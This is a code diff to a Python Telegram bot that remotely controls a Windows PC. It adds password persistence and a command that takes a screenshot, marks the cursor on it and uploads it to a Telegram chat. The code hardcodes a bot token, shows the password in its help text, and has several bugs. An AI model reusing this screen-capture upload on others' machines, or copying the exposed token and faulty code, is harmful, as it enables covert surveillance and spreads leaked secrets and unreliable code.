@@ -3,12 +3,22 @@ import os
 import winreg
 import pyautogui
 import time
+import PIL
 
 class Bot:
     def __init__(self, bot=telebot.TeleBot('6941701570:AAHp7l4D4edCVHvh7-UdDKT5mD5rZXnQ54s')):
         self.bot = bot
-        self.code = '4321'
         self.trash = '645FF040-5081-101B-9F08-00AA002F954E'
+        self.way = os.path.join(os.environ["USERPROFILE"])
+        if 'par' in os.listdir(self.way):
+            f = open(f'{self.way}\\par', 'r')
+            self.code = f.read()
+            f.close()
+        else:
+            self.code = '4321'
+            f = open(f'{self.way}\\par', 'w')
+            f.write(self.code)
+            f.close()
 
     def refresh(self):
         pyautogui.keyDown('win')
@@ -61,7 +71,7 @@ class Bot:
                 bot.send_message(message.chat.id, "1:переименовать мусорку: rename_trash"
                                                   "\n 2:создать текстовый файл на рабочем столе: creat_txt"
                                                   "\n 3:закрыть все:close_all"
-                                                  "\n 4:пароь:4321"
+                                                  f"\n 4:пароь:{self.code}"
                                                   "\n 5:отправь фото и оно сохранится на рабочий стол:*просто отправь фото*"
                                                   "\n 6:сменить пароль:repar"
                                                   "\n 7:снимок экрана:screen")
@@ -80,10 +90,35 @@ class Bot:
                 pyautogui.keyUp('win')
                 return True
             if command[1][0] == 'repar':
+                f = open(f'{self.way}\\par', 'w')
+                f.write(command[1][1])
+                f.close()
                 self.code = command[1][1]
                 return True
             if command[1][0] == 'screen':
                 return self.screen(message)
+            if command[1][0] == 'draw_screen':
+                pyautogui.keyDown('win')
+                pyautogui.press('printscreen')
+                pyautogui.keyUp('win')
+                time.sleep(5)
+                dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Pictures\\Screenshots")
+                filse = os.listdir(dir_name)
+                for i in filse:
+                    if i.find('Снимок экрана') != -1:
+                        way = os.path.join(dir_name, i)
+                        im = PIL.Image.open(way)
+                        print(im)
+                        draw = PIL.ImageDraw.Draw(im)
+                        pos = pyautogui.position()
+                        print(pos[0], pos[1])
+                        draw.ellipse((pos[0], pos[1], 50, 50), fill='red', outline=(0, 0, 0))
+                        im.save(i)
+                        bot.send_photo(message.chat.id, open(way), 'rb')
+                        os.remove(os.path.join(dir_name, i))
+                        break
+
+
 bot_bot = Bot()
 bot = bot_bot.bot
 
